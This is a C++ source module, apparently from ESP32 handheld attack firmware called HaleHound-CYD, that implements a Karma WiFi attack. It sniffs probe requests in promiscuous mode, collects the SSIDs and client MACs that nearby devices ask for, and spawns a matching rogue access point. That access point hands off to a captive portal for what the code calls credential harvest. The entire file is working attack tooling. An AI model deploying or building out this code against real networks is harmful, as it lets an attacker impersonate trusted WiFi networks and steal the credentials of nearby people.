// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD Karma Attack Module
// Probe request listener + rogue AP responder
// HaleHound Karma implementation
// Created: 2026-02-16
//
// Phase 1: COLLECT — sniff probe requests, build SSID pool
// Phase 2: ATTACK — spawn matching rogue AP, harvest credentials
// ═══════════════════════════════════════════════════════════════════════════

#include "karma_attack.h"
#include "wifi_attacks.h"
#include "touch_buttons.h"
#include "shared.h"
#include "utils.h"
#include "icon.h"
#include "nosifer_font.h"
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ═══════════════════════════════════════════════════════════════════════════
// EXTERNAL OBJECTS
// ═══════════════════════════════════════════════════════════════════════════

extern TFT_eSPI tft;

namespace KarmaAttack {

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════

#define KA_MAX_SSIDS        32      // Max unique SSIDs to track
#define KA_MAX_SSID_LEN     33      // Max SSID length + null
#define KA_MAX_DISPLAY      10      // Max SSIDs shown on screen
#define KA_DISPLAY_MS       300     // Display update interval
#define KA_BLINK_MS         400     // Blink interval
#define KA_CHANNEL_HOP_MS   500     // Channel hop interval

// Channel hop sequence — priority channels first
static const uint8_t hopChannels[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
static const int hopChannelCount = 13;

// ═══════════════════════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════════════════════

enum Phase { PHASE_COLLECT, PHASE_ATTACK };
static Phase currentPhase = PHASE_COLLECT;
static bool exitRequested = false;

// Collected SSIDs
struct ProbeEntry {
    char ssid[KA_MAX_SSID_LEN];
    uint8_t clientMAC[6];       // Last client that probed for this
    int probeCount;             // How many times probed
    unsigned long lastSeen;     // millis() of last probe
};
static ProbeEntry ssidPool[KA_MAX_SSIDS];
static int ssidCount = 0;
static int selectedSSID = -1;

// Stats
static volatile uint32_t totalProbes = 0;
static volatile uint32_t uniqueClients = 0;

// Client MAC tracking for unique count
#define KA_MAX_CLIENTS 64
static uint8_t seenClients[KA_MAX_CLIENTS][6];
static int clientCount = 0;

// Timing
static unsigned long lastDisplay = 0;
static unsigned long lastBlink = 0;
static unsigned long lastChannelHop = 0;
static bool blinkState = false;
static int currentHopIndex = 0;
static int scrollOffset = 0;

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR
// ═══════════════════════════════════════════════════════════════════════════

static void drawKAIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static bool isKABackTapped() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= 20 && ty <= 36 && tx >= 10 && tx < 30) {
            delay(150);
            return true;
        }
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// CLIENT TRACKING
// ═══════════════════════════════════════════════════════════════════════════

static bool isClientSeen(const uint8_t* mac) {
    for (int i = 0; i < clientCount; i++) {
        if (memcmp(seenClients[i], mac, 6) == 0) return true;
    }
    return false;
}

static void addClient(const uint8_t* mac) {
    if (clientCount < KA_MAX_CLIENTS && !isClientSeen(mac)) {
        memcpy(seenClients[clientCount], mac, 6);
        clientCount++;
        uniqueClients = clientCount;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SSID POOL MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static int findSSID(const char* ssid) {
    for (int i = 0; i < ssidCount; i++) {
        if (strcasecmp(ssidPool[i].ssid, ssid) == 0) return i;
    }
    return -1;
}

static void addSSID(const char* ssid, const uint8_t* clientMAC) {
    if (strlen(ssid) == 0) return;  // Ignore broadcast probes

    int idx = findSSID(ssid);
    if (idx >= 0) {
        // Already known — update
        ssidPool[idx].probeCount++;
        ssidPool[idx].lastSeen = millis();
        memcpy(ssidPool[idx].clientMAC, clientMAC, 6);
    } else if (ssidCount < KA_MAX_SSIDS) {
        // New SSID
        strncpy(ssidPool[ssidCount].ssid, ssid, KA_MAX_SSID_LEN - 1);
        ssidPool[ssidCount].ssid[KA_MAX_SSID_LEN - 1] = '\0';
        memcpy(ssidPool[ssidCount].clientMAC, clientMAC, 6);
        ssidPool[ssidCount].probeCount = 1;
        ssidPool[ssidCount].lastSeen = millis();
        ssidCount++;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PROMISCUOUS CALLBACK — PROBE REQUEST SNIFFER
// ═══════════════════════════════════════════════════════════════════════════

static volatile uint32_t dbgCallbackHits = 0;  // DEBUG — count raw callback invocations

static void IRAM_ATTR karmaCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    dbgCallbackHits++;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    // Check for Probe Request: Type=0 (Mgmt), Subtype=4
    uint16_t frameCtrl = (uint16_t)payload[0] | ((uint16_t)payload[1] << 8);
    uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    uint8_t frameSubType = (frameCtrl & 0xF0) >> 4;

    if (frameType != 0x00 || frameSubType != 0x04) return;

    totalProbes++;

    // Source MAC is at offset 10 (Address 2 = SA)
    const uint8_t* srcMAC = payload + 10;
    addClient(srcMAC);

    // Extract SSID from tagged parameters
    // Fixed params for Probe Request = none (unlike Beacon which has timestamp etc)
    // Tagged params start at offset 24
    int pos = 24;
    while (pos + 2 <= len) {
        uint8_t tagNum = payload[pos];
        uint8_t tagLen = payload[pos + 1];

        if (pos + 2 + tagLen > len) break;

        if (tagNum == 0 && tagLen > 0 && tagLen < KA_MAX_SSID_LEN) {
            // Tag 0 = SSID
            char ssid[KA_MAX_SSID_LEN];
            memcpy(ssid, payload + pos + 2, tagLen);
            ssid[tagLen] = '\0';

            // Filter garbage SSIDs (non-printable chars)
            bool valid = true;
            for (int i = 0; i < tagLen; i++) {
                if (ssid[i] < 0x20 || ssid[i] > 0x7E) {
                    valid = false;
                    break;
                }
            }
            if (valid) {
                addSSID(ssid, srcMAC);
            }
            break;
        }

        pos += 2 + tagLen;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// WIFI INIT FOR COLLECTION
// ═══════════════════════════════════════════════════════════════════════════

static void startCollection() {
    Serial.println("[KARMA] ====== startCollection BEGIN ======");

    wifi_mode_t mBefore;
    esp_wifi_get_mode(&mBefore);
    Serial.printf("[KARMA] WiFi mode before init: %d\n", (int)mBefore);

    // Full WiFi reset — ensures clean state after CaptivePortal or any prior module
    Serial.println("[KARMA] WiFi.mode(WIFI_OFF)...");
    bool offOk = WiFi.mode(WIFI_OFF);
    Serial.printf("[KARMA] WiFi.mode(WIFI_OFF) returned: %d\n", offOk);
    delay(100);

    // Probe Sniffer pattern — proven for probe capture on this hardware
    Serial.println("[KARMA] WiFi.mode(WIFI_STA)...");
    bool staOk = WiFi.mode(WIFI_STA);
    Serial.printf("[KARMA] WiFi.mode(WIFI_STA) returned: %d\n", staOk);

    WiFi.disconnect();
    delay(100);

    wifi_mode_t mAfter;
    esp_wifi_get_mode(&mAfter);
    Serial.printf("[KARMA] WiFi mode after STA init: %d\n", (int)mAfter);

    // Promiscuous mode — management frames only (probes)
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_err_t e1 = esp_wifi_set_promiscuous_filter(&filt);
    Serial.printf("[KARMA] set_promiscuous_filter: %s (0x%x)\n", esp_err_to_name(e1), e1);

    esp_err_t e2 = esp_wifi_set_promiscuous_rx_cb(karmaCallback);
    Serial.printf("[KARMA] set_promiscuous_rx_cb: %s (0x%x)\n", esp_err_to_name(e2), e2);

    dbgCallbackHits = 0;
    esp_err_t e3 = esp_wifi_set_promiscuous(true);
    Serial.printf("[KARMA] set_promiscuous(true): %s (0x%x)\n", esp_err_to_name(e3), e3);

    esp_err_t e4 = esp_wifi_set_channel(hopChannels[0], WIFI_SECOND_CHAN_NONE);
    Serial.printf("[KARMA] set_channel(%d): %s (0x%x)\n", hopChannels[0], esp_err_to_name(e4), e4);

    Serial.println("[KARMA] ====== startCollection END ======");
}

static void stopCollection() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
    Serial.println("[KARMA] Collection stopped");
}

// ═══════════════════════════════════════════════════════════════════════════
// UI: COLLECTION SCREEN
// ═══════════════════════════════════════════════════════════════════════════

static void drawCollectScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawKAIconBar();
    drawGlitchText(55, "KARMA", &Nosifer_Regular10pt7b);
    tft.drawLine(0, 58, SCREEN_WIDTH, 58, HALEHOUND_HOTPINK);

    // Stats labels
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 64);
    tft.print("PROBES:");
    tft.setCursor(100, 64);
    tft.print("SSIDs:");
    tft.setCursor(175, 64);
    tft.print("CLIENTS:");

    tft.drawLine(5, 76, 235, 76, HALEHOUND_VIOLET);

    // Column headers
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 80);
    tft.print("SSID");
    tft.setCursor(175, 80);
    tft.print("CNT");
    tft.setCursor(205, 80);
    tft.print("CLIENT");
    tft.drawLine(5, 90, 235, 90, HALEHOUND_GUNMETAL);

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(10, 300);
    tft.print("Tap SSID to spawn rogue AP");
}

static void updateCollectDisplay() {
    tft.setTextSize(1);

    // Stats values
    tft.fillRect(50, 64, 45, 10, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(50, 64);
    tft.print(totalProbes);

    tft.fillRect(140, 64, 30, 10, HALEHOUND_BLACK);
    tft.setCursor(140, 64);
    tft.print(ssidCount);

    tft.fillRect(225, 64, 15, 10, HALEHOUND_BLACK);
    tft.setCursor(225, 64);
    tft.print(uniqueClients);

    // Channel indicator
    tft.fillRect(200, 300, 40, 10, HALEHOUND_BLACK);
    tft.setTextColor(blinkState ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    tft.setCursor(200, 300);
    tft.printf("CH:%d", hopChannels[currentHopIndex]);

    // SSID list
    tft.fillRect(5, 92, 230, 200, HALEHOUND_BLACK);

    int showCount = ssidCount - scrollOffset;
    if (showCount > KA_MAX_DISPLAY) showCount = KA_MAX_DISPLAY;

    for (int i = 0; i < showCount; i++) {
        int idx = i + scrollOffset;
        int y = 94 + (i * 19);

        ProbeEntry& entry = ssidPool[idx];

        // Highlight recent probes (within last 3 seconds)
        bool recent = (millis() - entry.lastSeen) < 3000;

        // SSID name
        tft.setTextColor(recent ? HALEHOUND_MAGENTA : HALEHOUND_VIOLET);
        tft.setCursor(10, y);
        char truncSSID[22];
        strncpy(truncSSID, entry.ssid, 21);
        truncSSID[21] = '\0';
        tft.print(truncSSID);

        // Probe count
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(175, y);
        tft.print(entry.probeCount);

        // Client MAC (last 3 bytes)
        tft.setCursor(200, y);
        tft.printf("%02X%02X%02X",
                   entry.clientMAC[3], entry.clientMAC[4], entry.clientMAC[5]);

        // Separator line
        tft.drawFastHLine(10, y + 16, 220, HALEHOUND_DARK);
    }

    if (ssidCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(30, 150);
        if (blinkState) {
            tft.print("Listening for probes...");
        } else {
            tft.print("Channel hopping...");
        }
    }
}

static int checkSSIDListTouch() {
    uint16_t tx, ty;
    if (!getTouchPoint(&tx, &ty)) return -1;
    if (ty < 92 || ty > 284) return -1;

    int index = (ty - 92) / 19 + scrollOffset;
    if (index < 0 || index >= ssidCount) return -1;

    delay(200);
    return index;
}

// ═══════════════════════════════════════════════════════════════════════════
// UI: ATTACK SCREEN
// ═══════════════════════════════════════════════════════════════════════════

static void drawAttackScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawKAIconBar();
    drawGlitchText(55, "KARMA", &Nosifer_Regular10pt7b);
    tft.drawLine(0, 58, SCREEN_WIDTH, 58, HALEHOUND_HOTPINK);

    // Target SSID
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 68);
    tft.print("TARGET:");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(60, 68);
    tft.print(ssidPool[selectedSSID].ssid);

    tft.drawLine(5, 82, 235, 82, HALEHOUND_VIOLET);

    // Status
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 90);
    tft.print("Spawning rogue AP...");

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 110);
    tft.print("AP SSID: ");
    tft.print(ssidPool[selectedSSID].ssid);

    tft.setCursor(10, 130);
    tft.print("Handing off to Captive Portal");
    tft.setCursor(10, 148);
    tft.print("GARMR engine for credential");
    tft.setCursor(10, 166);
    tft.print("harvest...");
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    // Reset state
    currentPhase = PHASE_COLLECT;
    exitRequested = false;
    selectedSSID = -1;
    ssidCount = 0;
    totalProbes = 0;
    uniqueClients = 0;
    clientCount = 0;
    scrollOffset = 0;
    currentHopIndex = 0;
    lastDisplay = lastBlink = lastChannelHop = 0;
    blinkState = false;

    memset(ssidPool, 0, sizeof(ssidPool));
    memset(seenClients, 0, sizeof(seenClients));

    // Draw and start
    drawCollectScreen();
    startCollection();
}

void loop() {
    if (exitRequested) return;

    touchButtonsUpdate();

    // Back button
    if (isKABackTapped() || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (currentPhase == PHASE_ATTACK) {
            // Back to collection
            CaptivePortal::stopPortal();
            CaptivePortal::cleanup();
            currentPhase = PHASE_COLLECT;
            drawCollectScreen();
            startCollection();
            return;
        }
        exitRequested = true;
        return;
    }

    if (currentPhase == PHASE_COLLECT) {
        // Channel hopping
        if (millis() - lastChannelHop >= KA_CHANNEL_HOP_MS) {
            currentHopIndex = (currentHopIndex + 1) % hopChannelCount;
            esp_wifi_set_channel(hopChannels[currentHopIndex], WIFI_SECOND_CHAN_NONE);
            lastChannelHop = millis();
        }

        // Check for SSID selection
        int tapped = checkSSIDListTouch();
        if (tapped >= 0) {
            selectedSSID = tapped;

            // Stop collection
            stopCollection();

            // Show attack screen
            drawAttackScreen();
            delay(1000);

            // Hand off to existing Captive Portal engine
            CaptivePortal::setSSID(ssidPool[selectedSSID].ssid);
            CaptivePortal::setup();
            CaptivePortal::startPortal();

            currentPhase = PHASE_ATTACK;
            return;
        }

        // Scroll support — check touches at top/bottom edges
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty > 284 && ty < 300 && ssidCount > KA_MAX_DISPLAY) {
                if (scrollOffset < ssidCount - KA_MAX_DISPLAY) {
                    scrollOffset++;
                    delay(150);
                }
            } else if (ty > 58 && ty < 76 && scrollOffset > 0) {
                scrollOffset--;
                delay(150);
            }
        }

        // Blink
        if (millis() - lastBlink >= KA_BLINK_MS) {
            blinkState = !blinkState;
            lastBlink = millis();
            // DEBUG — dump stats every blink cycle
            Serial.printf("[KARMA-DBG] callbacks=%u probes=%u ssids=%d clients=%d ch=%d\n",
                          dbgCallbackHits, totalProbes, ssidCount, clientCount,
                          hopChannels[currentHopIndex]);
        }

        // Update display
        if (millis() - lastDisplay >= KA_DISPLAY_MS) {
            updateCollectDisplay();
            lastDisplay = millis();
        }
    } else {
        // ATTACK PHASE — run captive portal loop
        CaptivePortal::loop();

        // Check if portal exited
        if (CaptivePortal::isExitRequested()) {
            CaptivePortal::stopPortal();
            CaptivePortal::cleanup();
            currentPhase = PHASE_COLLECT;
            drawCollectScreen();
            startCollection();
        }
    }

    delay(10);
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (currentPhase == PHASE_COLLECT) {
        stopCollection();
    } else {
        CaptivePortal::stopPortal();
        CaptivePortal::cleanup();
    }
    exitRequested = false;
    currentPhase = PHASE_COLLECT;
}

}  // namespace KarmaAttack
